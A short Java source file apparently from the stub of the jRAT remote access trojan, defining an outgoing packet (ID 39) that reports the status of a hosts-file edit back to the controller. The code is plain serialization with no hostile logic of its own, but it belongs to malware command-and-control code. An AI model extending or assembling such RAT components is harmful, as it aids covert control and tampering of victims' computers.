package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet39HostEditResult extends AbstractOutgoingPacket {

	private String status;
	
	public Packet39HostEditResult(String status) {
		this.status = status;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(status);
	}

	@Override
	public byte getPacketId() {
		return 39;
	}

}
